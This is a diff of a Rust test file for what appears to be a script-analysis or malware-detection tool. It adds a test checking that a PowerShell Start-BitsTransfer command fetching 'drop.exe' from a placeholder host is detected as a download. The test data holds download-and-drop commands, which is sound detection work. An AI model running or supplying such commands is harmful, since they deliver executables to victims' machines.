@@ -26985,6 +26985,25 @@ powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%USERPROFILE%\Desk
     }
 
     #[test]
+    fn start_bitstransfer_positional_source_destination_extracted() {
+        let ps = r#"Start-BitsTransfer https://bits-positional.example/drop.exe C:\Temp\drop.exe"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://bits-positional.example/drop.exe"
+                        && dst.as_deref() == Some("C:\\Temp\\drop.exe")
+            )
+        });
+        assert!(
+            has,
+            "BITS positional source/destination was not extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn start_bitstransfer_destination_before_source_is_bounded() {
         let ps = r#"Start-BitsTransfer -Destination C:\Temp\bits.exe -Source https://bits-order.example/bits.exe"#;
         let script = format!("powershell -Command \"{}\"\r\n", ps);
